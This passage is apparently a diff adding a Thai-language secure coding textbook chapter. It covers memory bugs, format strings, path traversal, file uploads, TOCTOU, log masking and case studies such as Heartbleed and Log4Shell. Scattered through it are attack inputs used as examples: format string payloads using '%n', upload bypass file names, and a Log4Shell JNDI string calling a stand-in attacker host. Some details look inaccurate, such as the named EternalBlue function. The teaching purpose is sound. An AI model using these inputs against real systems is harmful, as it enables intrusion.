+    printf("User is_admin: %d\n", user->is_admin);  // อ่านค่า 1 — Privilege Escalation!
+    
+    return 0;
+}</code></pre>
+    <p><strong>แนวทางป้องกัน:</strong></p>
+    <pre><code>// 1. Set pointer to NULL after free
+free(user);
+user = NULL;
+
+// 2. ใช้ Smart Pointer (C++)
+#include &lt;memory&gt;
+std::unique_ptr&lt;User&gt; user = std::make_unique&lt;User&gt;();
+
+// 3. ใช้ Memory-safe Language
+// Rust: Compiler ตรวจสอบ Ownership → ป้องกัน Use-after-Free ที่ Compile-time</code></pre>
+    <h3 id="s3-5">9.3.5 Format String Vulnerabilities</h3>
+    <p>Format String Vulnerability (CWE-134) เกิดเมื่อข้อมูลที่ผู้ใช้ควบคุมถูกส่งเป็น Format String Parameter โดยตรง</p>
+    <pre><code>// C — Format String Vulnerability
+#include &lt;stdio.h&gt;
+
+void log_message(char *user_input) {
+    char buffer[256];
+    snprintf(buffer, sizeof(buffer), user_input);  // ❌
+    printf("%s\n", buffer);
+}
+
+// input = "%s%s%s%s%s%s"  → Crash
+// input = "%x.%x.%x.%x"   → อ่าน Stack Values
+// input = "%n"             → เขียนที่อยู่ → Code Execution</code></pre>
+    <p><strong>แนวทางที่ถูกต้อง:</strong></p>
+    <pre><code>void log_message(char *user_input) {
+    char buffer[256];
+    snprintf(buffer, sizeof(buffer), "%s", user_input);  // ✅
+    printf("%s\n", buffer);
+}</code></pre>
+    <p><strong>ภาษาและ Format String Risk:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>ภาษา</th><th>Format Function</th><th>ความเสี่ยง</th></tr></thead><tbody>
+      <tr><td><strong>C</strong></td><td><code>printf(user_input)</code></td><td><strong>สูง</strong> — อ่าน/เขียน Stack โดยตรง</td></tr>
+      <tr><td><strong>C++</strong></td><td><code>boost::format</code></td><td>ปานกลาง — Exception อาจรั่วข้อมูล</td></tr>
+      <tr><td><strong>Java</strong></td><td><code>String.format()</code></td><td>ต่ำ — ไม่มีการเขียนหน่วยความจำ</td></tr>
+      <tr><td><strong>Python</strong></td><td><code>"format".format()</code></td><td>ต่ำ — แต่ระวัง Object Attribute Access</td></tr>
+      <tr><td><strong>JavaScript</strong></td><td>Template Literal</td><td>ต่ำ — Sandboxed</td></tr>
+    </tbody></table></div>    <h2 id="s4">9.4 Secure File และ Resource Management</h2>
+    <p>การจัดการไฟล์และทรัพยากรระบบอย่างปลอดภัยเป็นหัวข้อที่นักพัฒนามักมองข้าม นำไปสู่ช่องโหว่ Path Traversal, File Upload Attack, และ Race Conditions</p>
+    <h3 id="s4-1">9.4.1 Path Traversal Prevention</h3>
+    <p>Path Traversal (CWE-22) คือการที่ผู้โจมตีใช้ <code>../</code> เพื่อเข้าถึงไฟล์นอก Directory ที่กำหนด</p>
+    <pre><code># ไม่ปลอดภัย: Path Traversal
+import os
+
+def read_file(filename):
+    base_path = "/var/www/uploads/"
+    full_path = base_path + filename
+    with open(full_path, 'r') as f:
+        return f.read()</code></pre>
+    <pre><code># ปลอดภัย: ป้องกัน Path Traversal
+import os
+
+def read_file_safe(filename):
+    base_path = "/var/www/uploads/"
+    full_path = os.path.realpath(os.path.join(base_path, filename))
+    if not full_path.startswith(os.path.realpath(base_path)):
+        raise SecurityException("Path traversal detected")
+    if not os.path.exists(full_path):
+        raise FileNotFoundError("File not found")
+    with open(full_path, 'r') as f:
+        return f.read()</code></pre>
+    <p><strong>แนวทางป้องกัน Path Traversal:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>มาตรการ</th><th>คำอธิบาย</th></tr></thead><tbody>
+      <tr><td><strong>Path Canonicalization</strong></td><td>ใช้ <code>realpath()</code> หรือ <code>normalize()</code> เพื่อ Resolve <code>../</code> และ Symbolic Links</td></tr>
+      <tr><td><strong>Prefix Check</strong></td><td>ตรวจสอบว่า Canonical Path ขึ้นต้นด้วย Base Directory</td></tr>
+      <tr><td><strong>Allowlist File Names</strong></td><td>กำหนดรายชื่อไฟล์ที่อนุญาต — ดีที่สุดสำหรับกรณีที่ทำได้</td></tr>
+      <tr><td><strong>Avoid User Input in Path</strong></td><td>ใช้ Indirection Map — mapping จาก ID → จริง</td></tr>
+      <tr><td><strong>Chroot/Jail</strong></td><td>จำกัด Process ให้เห็นเฉพาะ Directory ที่กำหนด</td></tr>
+      <tr><td><strong>Least Privilege</strong></td><td>Application ควรใช้สิทธิ์เท่าที่จำเป็น — ไม่ใช่ Root</td></tr>
+    </tbody></table></div>
+    <h3 id="s4-2">9.4.2 File Permission Management</h3>
+    <p>การกำหนดสิทธิ์ไฟล์ที่ผิดเป็นสาเหตุของช่องโหว่ CWE-276 (Incorrect Default Permissions)</p>
+    <pre><code># ไม่ปลอดภัย: Default Permission ที่กว้างเกินไป
+def save_config(data, filename):
+    with open(filename, 'w') as f:
+        f.write(data)</code></pre>
+    <pre><code># ปลอดภัย: กำหนด Permission อย่างชัดเจน
+import os
+import stat
+
+def save_config_safe(data, filename):
+    fd = os.open(filename, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 
+                 stat.S_IRUSR | stat.S_IWUSR)  # 600
+    with os.fdopen(fd, 'w') as f:
+        f.write(data)</code></pre>
+    <p><strong>แนวทางปฏิบัติ File Permissions:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>สถานการณ์</th><th style="text-align:center">Permission ที่แนะนำ</th><th>คำอธิบาย</th></tr></thead><tbody>
+      <tr><td>Configuration Files</td><td style="text-align:center">600 (Owner Read/Write)</td><td>มีเฉพาะ Application Owner</td></tr>
+      <tr><td>Log Files</td><td style="text-align:center">640 (Owner Read/Write, Group Read)</td><td>ให้ Log Rotator อ่านได้</td></tr>
+      <tr><td>Upload Directory</td><td style="text-align:center">750 (Owner rwx, Group rx)</td><td>ไม่ให้ Others เข้าถึง</td></tr>
+      <tr><td>Executable Scripts</td><td style="text-align:center">750 (Owner rwx, Group rx)</td><td>ไม่ให้ Others Execute</td></tr>
+      <tr><td>Shared Files</td><td style="text-align:center">660 (Owner rw, Group rw)</td><td>เฉพาะกลุ่มที่จำเป็น</td></tr>
+      <tr><td>Public Static Files</td><td style="text-align:center">644 (Owner rw, Others r)</td><td>ผ่าน Web Server เท่านั้น</td></tr>
+    </tbody></table></div>
+    <h3 id="s4-3">9.4.3 File Upload Security</h3>
+    <p>File Upload เป็นหนึ่งในฟังก์ชันที่อันตรายที่สุด — ผู้โจมตีสามารถอัปโหลดไฟล์อันตราย (Web Shell, Malware) ถ้าไม่มีการป้องกันที่เหมาะสม</p>
+    <p><strong>แนวทางป้องกัน File Upload (Defense in Depth):</strong></p>
+    <div class="table-wrap"><table><thead><tr><th style="text-align:center">ชั้น</th><th>มาตรการ</th><th>คำอธิบาย</th></tr></thead><tbody>
+      <tr><td style="text-align:center">1</td><td><strong>File Type Validation</strong></td><td>ตรวจสอบ Magic Number (ไม่ใช่แค่ Extension)</td></tr>
+      <tr><td style="text-align:center">2</td><td><strong>File Size Limit</strong></td><td>จำกัดขนาดไฟล์สูงสุด</td></tr>
+      <tr><td style="text-align:center">3</td><td><strong>File Name Sanitization</strong></td><td>ลบ Path Traversal, Special Characters</td></tr>
+      <tr><td style="text-align:center">4</td><td><strong>Content Scanning</strong></td><td>สแกนไวรัส (ClamAV)</td></tr>
+      <tr><td style="text-align:center">5</td><td><strong>Storage Location</strong></td><td>เก็บนอก Web Root</td></tr>
+      <tr><td style="text-align:center">6</td><td><strong>Storage Name</strong></td><td>ใช้ Random Name — ไม่ใช้ชื่อเดิม</td></tr>
+      <tr><td style="text-align:center">7</td><td><strong>Served via Script</strong></td><td>ไม่ Serve Directly — ผ่าน Download Script ที่ตรวจสอบสิทธิ์</td></tr>
+    </tbody></table></div>
+    <p><strong>ตัวอย่าง File Upload Validation (Python):</strong></p>
+    <pre><code>import os
+import uuid
+import magic
+from werkzeug.utils import secure_filename
+
+ALLOWED_TYPES = {
+    'image/jpeg': [b'\xFF\xD8\xFF'],
+    'image/png': [b'\x89PNG\r\n\x1a\n'],
+    'image/gif': [b'GIF87a', b'GIF89a'],
+    'application/pdf': [b'%PDF'],
+}
+
+MAX_FILE_SIZE = 10 * 1024 * 1024
+
+def validate_file(file_storage):
+    if file_storage.content_length > MAX_FILE_SIZE:
+        raise ValueError("File size exceeds limit")
+    file_data = file_storage.read(1024)
+    file_storage.seek(0)
+    mime_type = magic.from_buffer(file_data, mime=True)
+    if mime_type not in ALLOWED_TYPES:
+        raise ValueError(f"File type {mime_type} is not allowed")
+    is_valid = any(file_data.startswith(sig) for sig in ALLOWED_TYPES[mime_type])
+    if not is_valid:
+        raise ValueError("File content does not match claimed type")
+    return True
+
+def save_upload(file_storage):
+    original_name = secure_filename(file_storage.filename)
+    ext = os.path.splitext(original_name)[1]
+    safe_name = str(uuid.uuid4()) + ext
+    upload_dir = "/var/data/uploads/"
+    os.makedirs(upload_dir, exist_ok=True)
+    safe_path = os.path.join(upload_dir, safe_name)
+    file_storage.save(safe_path)
+    return safe_name</code></pre>
+    <p><strong>ข้อควรระวัง File Upload:</strong></p>
+    <ul>
+      <li><strong>Double Extension:</strong> <code>shell.php.jpg</code> — Web Server อาจรันเป็น PHP</li>
+      <li><strong>Null Byte Injection:</strong> <code>file.php%00.jpg</code> — ภาษาเก่าตัดที่ <code>%00</code></li>
+      <li><strong>SVG Upload:</strong> SVG มี XML — อาจมี XSS หรือ XXE</li>
+      <li><strong>ZIP Bomb:</strong> ไฟล์ ZIP เล็กๆ ที่เมื่อแตกแล้วใหญ่จนเต็ม Disk</li>
+      <li><strong>Race Condition:</strong> ตรวจสอบแล้ว แต่ก่อนบันทึก ไฟล์ถูกเปลี่ยน</li>
+    </ul>    <h3 id="s4-4">9.4.4 Temporary File Management</h3>
+    <p>Temporary Files ที่จัดการไม่ปลอดภัยนำไปสู่ Race Condition, Information Disclosure, และ Privilege Escalation</p>
+    <pre><code># ไม่ปลอดภัย: Temporary File ที่ predictable
+import tempfile
+import os
+
+def process_temp_data():
+    temp_path = f"/tmp/data_{os.getpid()}.txt"
+    with open(temp_path, 'w') as f:
+        f.write("sensitive_data")</code></pre>
+    <pre><code># ปลอดภัย: ใช้ tempfile module
+import tempfile
+
+def process_temp_data_safe():
+    with tempfile.NamedTemporaryFile(mode='w', prefix='secure_', 
+                                      suffix='.tmp', delete=True) as f:
+        f.write("sensitive_data")
+        temp_path = f.name</code></pre>
+    <p><strong>แนวทางปฏิบัติสำหรับ Temporary Files:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>ข้อปฏิบัติ</th><th>คำอธิบาย</th></tr></thead><tbody>
+      <tr><td>ใช้ Secure Temp Functions</td><td><code>tempfile.NamedTemporaryFile</code> (Python), <code>File.createTempFile</code> (Java)</td></tr>
+      <tr><td>ตั้งชื่อแบบสุ่ม</td><td>ไม่ใช้ PID หรือ Timestamp เพียงอย่างเดียว</td></tr>
+      <tr><td>ตั้ง Permission ที่จำกัด</td><td>600 — อ่านได้เฉพาะเจ้าของ Process</td></tr>
+      <tr><td>ลบหลังใช้งาน</td><td>ใช้ Context Manager หรือ try-finally</td></tr>
+      <tr><td>ไม่ใช้ /tmp</td><td>ใช้ Directory เฉพาะของ Application</td></tr>
+      <tr><td>จำกัดขนาด</td><td>ป้องกัน Disk Exhaustion</td></tr>
+    </tbody></table></div>
+    <h3 id="s4-5">9.4.5 Race Condition (TOCTOU)</h3>
+    <p>TOCTOU (Time of Check, Time of Use) — CWE-362 — เป็นช่องโหว่ที่เกิดจากการตรวจสอบแล้วใช้ข้อมูล โดยมีช่วงเวลาที่สถานะเปลี่ยนก่อนการใช้</p>
+    <pre><code># TOCTOU Race Condition — ไม่ปลอดภัย
+import os
+
+def check_and_use(filename):
+    if not os.path.exists(filename):
+        return "File does not exist"
+    if not os.access(filename, os.R_OK):
+        return "No read permission"
+    with open(filename, 'r') as f:
+        return f.read()</code></pre>
+    <pre><code># ป้องกัน TOCTOU — ปลอดภัยกว่า
+import os
+
+def safe_check_and_use(filename):
+    try:
+        fd = os.open(filename, os.O_RDONLY | os.O_NOFOLLOW)
+    except PermissionError:
+        return "No read permission"
+    except FileNotFoundError:
+        return "File does not exist"
+    try:
+        stat_info = os.fstat(fd)
+        if not stat.S_ISREG(stat_info.st_mode):
+            return "Not a regular file"
+        with os.fdopen(fd, 'r') as f:
+            return f.read()
+    except:
+        os.close(fd)
+        raise</code></pre>
+    <p><strong>ตัวอย่าง TOCTOU ในโลกจริง (2024-2025):</strong></p>
+    <div class="table-wrap"><table><thead><tr><th style="text-align:center">CVE</th><th>ปี</th><th>รายละเอียด</th><th>ผลกระทบ</th></tr></thead><tbody>
+      <tr><td style="text-align:center"><strong>CVE-2024-50379</strong></td><td>2024</td><td>Apache Tomcat — TOCTOU ใน JSP compilation บน case-insensitive filesystems</td><td>RCE — CVSS 9.8</td></tr>
+      <tr><td style="text-align:center"><strong>CVE-2025-68146</strong></td><td>2025</td><td>Python filelock — TOCTOU ใน file lock creation</td><td>Data Corruption</td></tr>
+      <tr><td style="text-align:center"><strong>CVE-2024-28717</strong></td><td>2024</td><td>Python storlets — TOCTOU race condition ระหว่าง write และ chmod</td><td>Privilege Escalation</td></tr>
+    </tbody></table></div>
+    <h2 id="s5">9.5 การป้องกันข้อมูลรั่วไหลใน Log</h2>
+    <p>Logging เป็นสิ่งจำเป็นสำหรับ Debugging, Monitoring, และ Forensics แต่ Log ที่ไม่ปลอดภัยสามารถรั่วไหลข้อมูลสำคัญไปยังผู้ที่ไม่ควรเข้าถึง</p>
+    <h3 id="s5-1">9.5.1 ข้อมูลที่ห้าม Log</h3>
+    <div class="table-wrap"><table><thead><tr><th>ประเภท</th><th>ตัวอย่าง</th><th>ความเสี่ยง</th></tr></thead><tbody>
+      <tr><td><strong>Passwords</strong></td><td>รหัสผ่านทุกประเภท, PIN</td><td>Identity Theft, Account Takeover</td></tr>
+      <tr><td><strong>Secrets/Keys</strong></td><td>API Keys, Encryption Keys, JWT Secrets</td><td>System Compromise</td></tr>
+      <tr><td><strong>PII</strong></td><td>ชื่อ, นามสกุล, ที่อยู่, เบอร์โทร, Email</td><td>Privacy Violation, PDPA/HIPAA/GDPR Fine</td></tr>
+      <tr><td><strong>Payment Data</strong></td><td>เลขบัตรเครดิต, CVV, CVV2</td><td>PCI DSS Violation, Financial Fraud</td></tr>
+      <tr><td><strong>Authentication Tokens</strong></td><td>Session ID, Access Token, Refresh Token</td><td>Session Hijacking</td></tr>
+      <tr><td><strong>Health Information</strong></td><td>เวชระเบียน, ผลตรวจ, ประวัติการรักษา</td><td>HIPAA Violation</td></tr>
+      <tr><td><strong>Credentials</strong></td><td>Database Connection String, SSH Keys</td><td>Data Breach</td></tr>
+    </tbody></table></div>
+    <pre><code># ไม่ปลอดภัย: Log ข้อมูลสำคัญ
+import logging
+logger = logging.getLogger(__name__)
+
+def login_user(username, password):
+    logger.info(f"Login attempt: username={username}, password={password}")  # ❌
+    logger.info(f"User logged in: token={auth_token}")  # ❌</code></pre>
+    <pre><code># ปลอดภัย: Mask ข้อมูลสำคัญ
+def login_user(username, password):
+    logger.info(f"Login attempt: username={username}")
+
+def mask_email(email):
+    local, domain = email.split('@')
+    return f"{local[0]}***@{domain}"
+
+def mask_credit_card(card_number):
+    return f"****-****-****-{card_number[-4:]}"
+
+logger.info(f"Email: {mask_email('alice@example.com')}")
+logger.info(f"Card: {mask_credit_card('4111-1111-1111-1111')}")</code></pre>    <h3 id="s5-2">9.5.2 Log Sanitization และ Masking</h3>
+    <p>Log Sanitization เป็นกระบวนการกรองหรือ Mask ข้อมูลที่ละเอียดอ่อนก่อนเขียน Log</p>
+    <pre><code>// Java — Log Sanitization
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
+public class SecureLogger {
+    private static final Logger logger = LoggerFactory.getLogger(SecureLogger.class);
+    
+    public static void logUserAction(String action, User user) {
+        SafeUserDTO safeUser = new SafeUserDTO(user);
+        logger.info("User action: {}", safeUser);
+    }
+}</code></pre>
+    <p><strong>เทคนิคการ Mask ข้อมูล:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>ข้อมูล</th><th>ตัวอย่างเดิม</th><th>ตัวอย่างที่ Log</th></tr></thead><tbody>
+      <tr><td>Password</td><td><code>myP@ss123</code></td><td><code>********</code></td></tr>
+      <tr><td>Credit Card</td><td><code>4111111111111111</code></td><td><code>************1111</code></td></tr>
+      <tr><td>Email</td><td><code>alice@example.com</code></td><td><code>a***@example.com</code></td></tr>
+      <tr><td>Phone</td><td><code>081-234-5678</code></td><td><code>***-***-5678</code></td></tr>
+      <tr><td>IP Address (บางส่วน)</td><td><code>192.168.1.100</code></td><td><code>192.168.x.x</code></td></tr>
+      <tr><td>API Token</td><td><code>sk-proj-AbCdEf123456</code></td><td><code>sk-proj-***</code></td></tr>
+      <tr><td>SSN/ID Number</td><td><code>123-45-6789</code></td><td><code>***-**-6789</code></td></tr>
+    </tbody></table></div>
+    <h3 id="s5-3">9.5.3 Centralized Logging และ Log Retention</h3>
+    <p>Logs ต้องถูกเก็บอย่างปลอดภัย มี Access Control และมี Retention Policy ที่เหมาะสม</p>
+    <pre><code># Python — Log Rotation ที่ปลอดภัย
+import logging
+from logging.handlers import RotatingFileHandler
+
+handler = RotatingFileHandler(
+    '/var/log/app/secure_app.log',
+    maxBytes=100 * 1024 * 1024,
+    backupCount=10,
+    mode='a'
+)
+
+import os
+os.chmod('/var/log/app/secure_app.log', 0o640)
+
+logger = logging.getLogger(__name__)
+logger.setLevel(logging.INFO)
+logger.addHandler(handler)</code></pre>
+    <p><strong>แนวทางปฏิบัติ Log Retention:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>ปัจจัย</th><th>คำแนะนำ</th></tr></thead><tbody>
+      <tr><td><strong>Retention Period</strong></td><td>90-365 วัน (ขึ้นอยู่กับ Legal/Compliance Requirement)</td></tr>
+      <tr><td><strong>Log Rotation</strong></td><td>หมุนเวียนทุกวัน หรือเมื่อถึงขนาดที่กำหนด</td></tr>
+      <tr><td><strong>Access Control</strong></td><td>เฉพาะ Admin และ Security Team</td></tr>
+      <tr><td><strong>Encryption at Rest</strong></td><td>เข้ารหัส Log Files โดยเฉพาะที่มี PII</td></tr>
+      <tr><td><strong>Encryption in Transit</strong></td><td>TLS สำหรับส่ง Log ไปยัง Central System</td></tr>
+      <tr><td><strong>Audit Trail</strong></td><td>ใครเข้าถึง Log บ้าง ต้องถูกบันทึก</td></tr>
+      <tr><td><strong>Deletion</strong></td><td>ลบอย่างปลอดภัยเมื่อเกิน Retention</td></tr>
+    </tbody></table></div>
+    <h3 id="s5-4">9.5.4 Secure Log Storage และ Access Control</h3>
+    <p>Log ต้องถูกจัดเก็บในที่ที่ปลอดภัยและมี Access Control ที่เหมาะสม</p>
+    <pre><code># Python — Structured Logging (JSON)
+import structlog
+
+structlog.configure(
+    processors=[
+        structlog.stdlib.filter_by_level,
+        structlog.stdlib.add_logger_name,
+        structlog.stdlib.add_log_level,
+        structlog.stdlib.PositionalArgumentsFormatter(),
+        structlog.processors.TimeStamper(fmt="iso"),
+        structlog.processors.StackInfoRenderer(),
+        structlog.processors.format_exc_info,
+        structlog.processors.JSONRenderer()
+    ],
+    wrapper_class=structlog.stdlib.BoundLogger,
+    context_class=dict,
+    logger_factory=structlog.stdlib.LoggerFactory(),
+    cache_logger_on_first_use=True,
+)
+
+logger = structlog.get_logger()
+
+logger.info("user_login", 
+    user_id="12345", 
+    ip_address="192.168.1.100",
+)</code></pre>
+    <p><strong>สิ่งที่ควรทำและไม่ควรทำเกี่ยวกับ Log:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>✅ ควรทำ</th><th>❌ ไม่ควรทำ</th></tr></thead><tbody>
+      <tr><td>Log เฉพาะข้อมูลที่จำเป็น</td><td>Log รหัสผ่าน, Secrets, หรือ PII</td></tr>
+      <tr><td>Mask ข้อมูลสำคัญก่อน Log</td><td>Log Request/Response Body โดยตรง</td></tr>
+      <tr><td>ใช้ Structured Logging (JSON)</td><td>Log ใน Format ที่อ่านด้วยเครื่องไม่ได้</td></tr>
+      <tr><td>กำหนด Access Control และ Retention</td><td>เก็บ Log ไว้ไม่จำกัดโดยไม่มี Rotation</td></tr>
+      <tr><td>เข้ารหัส Log ที่ Sensitive</td><td>แชร์ Log File โดยไม่ตรวจสอบเนื้อหา</td></tr>
+      <tr><td>ตรวจสอบ Log เป็นระยะ</td><td>ตั้ง Log Level ต่ำเกินไปใน Production</td></tr>
+    </tbody></table></div>
+    <h2 id="s6">9.6 กรณีศึกษาและเหตุการณ์จริง</h2>
+    <h3 id="s6-1">9.6.1 Heartbleed (CVE-2014-0160) — Buffer Over-read</h3>
+    <p>Heartbleed เป็น Buffer Over-read (CWE-125) ใน OpenSSL ที่ทำให้ผู้โจมตีอ่าน Memory ของ Server ได้ครั้งละ 64 KB — CVSS Score: 5.0 (Medium) แต่ผลกระทบสูงมาก</p>
+    <p><strong>ที่มา:</strong> การ Implement TLS Heartbeat Extension (RFC 6520) ที่ไม่ตรวจสอบ Length Parameter — Server อ่าน Memory ตาม Length ที่ Client ส่ง โดยไม่ตรวจสอบว่า Length ตรงกับ Buffer จริงหรือไม่ — OpenSSL เวอร์ชัน 1.0.1 ถึง 1.0.1f แก้ไขใน 1.0.1g</p>
+    <p><strong>ผลกระทบ:</strong> Private Key, Session Keys, Passwords, User Data ของเซิร์ฟเวอร์ ~500,000 เครื่องรั่วไหล</p>
+    <p><strong>บทเรียน:</strong></p>
+    <ul>
+      <li>Buffer Operations ต้องตรวจสอบ Bounds ทุกครั้ง</li>
+      <li>Library ที่มีคนใช้มากที่สุดก็มี Bug ได้</li>
+      <li>Memory-safe Language (Rust) กำลังถูกใช้เขียน OpenSSL alternatives (rustls, BoringSSL)</li>
+      <li>Defense in Depth: ถึง Crypto จะแข็งแรง แต่ Memory Safety ที่ไม่ดีทำลายทุกอย่าง</li>
+    </ul>
+    <h3 id="s6-2">9.6.2 Morris Worm (1988) — Buffer Overflow แรกที่มีผลกระทบในวงกว้าง</h3>
+    <p>Morris Worm เป็นหนึ่งในการโจมตีแบบ Buffer Overflowครั้งแรกที่สร้างความเสียหายเป็นวงกว้าง ใช้ Buffer Overflow ใน <code>fingerd</code> (CVE-1999-0514) และ <code>sendmail</code></p>
+    <p><strong>บทเรียน:</strong></p>
+    <ul>
+      <li>ข้อบกพร่องในโค้ด C ระดับ System Service นำไปสู่ Remote Code Execution</li>
+      <li>ต้องมีการตรวจสอบ Input ทุกครั้งโดยเฉพาะในภาษาที่ไม่ Safe ทางหน่วยความจำ</li>
+      <li>Network Service ต้อง Sandbox และใช้ Least Privilege</li>
+    </ul>
+    <h3 id="s6-3">9.6.3 WannaCry (2017) — EternalBlue (CVE-2017-0144)</h3>
+    <p>EternalBlue เป็น Buffer Overflow ใน SMB Protocol ของ Microsoft Windows — ใช้โดย WannaCry Ransomware ที่สร้างความเสียหาย &gt; $4 พันล้าน ครอบคลุม 150 ประเทศ</p>
+    <p><strong>ที่มา:</strong> Buffer Overflow ใน SMB <code>srvsvc.NetrServerPasswordSet2</code> — Microsoft ออก Patch ใน MS17-010 (มีนาคม 2017) แต่หลายองค์กรไม่ได้อัปเดต</p>
+    <p><strong>บทเรียน:</strong></p>
+    <ul>
+      <li>Patch Management สำคัญ — WannaCry ใช้ช่องโหว่ที่ Patch ออกมาก่อน 2 เดือน</li>
+      <li>Memory Safety ใน Protocol Implementation สำคัญ</li>
+      <li>Defense in Depth: Firewall Block SMB Port 445 จาก Internet</li>
+    </ul>
+    <h3 id="s6-4">9.6.4 กรณี File Upload — Atlassian (CVE-2022-0540)</h3>
+    <p>ช่องโหว่ใน Atlassian Jira Authentication ผ่าน File Upload — ผู้โจมตีสามารถ Bypass Authentication โดยอัปโหลดไฟล์ที่มีการจัดการ Session ไม่ถูกต้อง</p>
+    <p><strong>บทเรียน:</strong></p>
+    <ul>
+      <li>File Upload Function เป็น Attack Vector ที่อันตราย</li>
+      <li>ทุกไฟล์ที่อัปโหลดต้องถูกตรวจสอบ — ทั้งชื่อ, เนื้อหา, Magic Number</li>
+      <li>อย่า Execute หรือ Serve ไฟล์จาก Upload Directory โดยตรง</li>
+    </ul>
+    <h3 id="s6-5">9.6.5 Log4Shell (CVE-2021-44228) — Log Injection</h3>
+    <p>Log4Shell เป็นช่องโหว่ใน Apache Log4j ที่ทำให้เกิดCode Execution ผ่าน Log Message — ผู้โจมตีส่ง <code>${jndi:ldap://attacker.com/a}</code> ใน Header หรือ Input</p>
+    <p><strong>ความเกี่ยวข้องกับบทนี้:</strong></p>
+    <ul>
+      <li>Logging Library ที่ไม่ Sanitize Input นำไปสู่ Remote Code Execution</li>
+      <li>Log Message ต้องถูก Sanitized ก่อนเขียน — ไม่ Trust Data ที่จะ Log</li>
+      <li>Dependency Management สำคัญ — Log4j เป็น Library ที่ถูกใช้มากที่สุดใน Java World</li>
+    </ul>
+    <p><strong>บทเรียน:</strong></p>
+    <ul>
+      <li>ไม่ Trust Input ที่จะ Log — Sanitize ก่อน Log เสมอ</li>
+      <li>Logging Library ที่ไม่ได้ออกแบบมาให้ Secure อาจเป็น Attack Vector</li>
+      <li>Supply Chain Security — ตรวจสอบ Library Version ที่ใช้</li>
+    </ul>    <h2 id="s7">9.7 สรุปและแนวทางปฏิบัติ</h2>
+    <h3 id="s7-1">9.7.1 Secure Coding Checklist ก่อนส่งมอบ</h3>
+    <div class="interactive" id="play-checklist">
+      <h4>Interactive: Secure Coding Checklist ก่อนส่งมอบ</h4>
+      <p>ทำเครื่องหมายรายการที่ตรวจสอบแล้วเพื่อดูคะแนนความพร้อม</p>
+      <p style="font-weight:600;color:var(--navy);margin-top:.75rem">Defensive Programming:</p>
+      <div class="checklist" id="chkDefensive">
+        <label><input type="checkbox" value="dv1"> Input Validation — Allowlist ที่ Server Side เสมอ</label>
+        <label><input type="checkbox" value="dv2"> Output Encoding — ตาม Context (HTML, JS, URL, CSS)</label>
+        <label><input type="checkbox" value="dv3"> Parameters ใช้ Prepared Statement / Parameterized Query</label>
+        <label><input type="checkbox" value="dv4"> ใช้ Immutable Objects สำหรับ Sensitive Data</label>
+        <label><input type="checkbox" value="dv5"> ทำ Defensive Copying ก่อนเก็บ Reference</label>
+        <label><input type="checkbox" value="dv6"> ใช้ Fail Safe สำหรับ Security-sensitive Operations</label>
+      </div>
+      <div class="meter"><div class="meter-fill" id="chkDefensiveMeter"></div></div>
+      <div id="chkDefensiveResult" class="result">ทำเครื่องหมายรายการที่ตรวจสอบแล้ว</div>
+      <p style="font-weight:600;color:var(--navy);margin-top:1rem">Error Handling:</p>
+      <div class="checklist" id="chkError">
+        <label><input type="checkbox" value="er1"> Global Error Handler ครอบคลุมทุก Exception</label>
+        <label><input type="checkbox" value="er2"> Error Message ไม่เปิดเผย Stack Trace หรือ Internal Details</label>
+        <label><input type="checkbox" value="er3"> Resource Cleanup ใน finally / with / try-with-resources</label>
+        <label><input type="checkbox" value="er4"> Custom Error Page ที่ปลอดภัย</label>
+      </div>
+      <div class="meter"><div class="meter-fill" id="chkErrorMeter"></div></div>
+      <div id="chkErrorResult" class="result">ทำเครื่องหมายรายการที่ตรวจสอบแล้ว</div>
+      <p style="font-weight:600;color:var(--navy);margin-top:1rem">Memory Safety:</p>
+      <div class="checklist" id="chkMemory">
+        <label><input type="checkbox" value="mm1"> ถ้าใช้ C/C++ — Enable Stack Protector, ASLR, DEP</label>
+        <label><input type="checkbox" value="mm2"> ใช้ Memory-safe Language Feature (Rust Ownership, Java GC)</label>
+        <label><input type="checkbox" value="mm3"> ตรวจสอบ Bounds ทุกครั้งก่อน Read/Write Buffer</label>
+        <label><input type="checkbox" value="mm4"> ตรวจสอบ Integer Overflow สำหรับภาษา C/C++/Java/Go</label>
+      </div>
+      <div class="meter"><div class="meter-fill" id="chkMemoryMeter"></div></div>
+      <div id="chkMemoryResult" class="result">ทำเครื่องหมายรายการที่ตรวจสอบแล้ว</div>
+      <p style="font-weight:600;color:var(--navy);margin-top:1rem">File Management:</p>
+      <div class="checklist" id="chkFile">
+        <label><input type="checkbox" value="fl1"> Path Traversal Prevention — Canonicalize + Prefix Check</label>
+        <label><input type="checkbox" value="fl2"> File Upload — Magic Number Validation + Size Limit + Random Name</label>
+        <label><input type="checkbox" value="fl3"> จำกัด File Permissions — 600/640 ตามความจำเป็น</label>
+        <label><input type="checkbox" value="fl4"> ป้องกัน TOCTOU — เปิดก่อนตรวจสอบ, ใช้ O_NOFOLLOW</label>
+      </div>
+      <div class="meter"><div class="meter-fill" id="chkFileMeter"></div></div>
+      <div id="chkFileResult" class="result">ทำเครื่องหมายรายการที่ตรวจสอบแล้ว</div>
+      <p style="font-weight:600;color:var(--navy);margin-top:1rem">Logging:</p>
+      <div class="checklist" id="chkLog">
+        <label><input type="checkbox" value="lg1"> ไม่ Log Passwords, Secrets, PII, Tokens</label>
+        <label><input type="checkbox" value="lg2"> Mask ข้อมูลที่ละเอียดอ่อน</label>
+        <label><input type="checkbox" value="lg3"> Log Rotation และ Retention Policy</label>
+        <label><input type="checkbox" value="lg4"> Access Control สำหรับ Log Files</label>
+      </div>
+      <div class="meter"><div class="meter-fill" id="chkLogMeter"></div></div>
+      <div id="chkLogResult" class="result">ทำเครื่องหมายรายการที่ตรวจสอบแล้ว</div>
+      <p style="font-weight:600;color:var(--navy);margin-top:1rem">คะแนนรวมทุกหมวด:</p>
+      <div class="meter" style="height:12px"><div class="meter-fill" id="chkTotalMeter"></div></div>
+      <div id="chkTotalResult" class="result" style="font-weight:600;color:var(--navy)">ทำเครื่องหมายรายการทั้งหมดเพื่อดูคะแนนรวม</div>
+    </div>
+    <div class="interactive" id="play-securecoding">
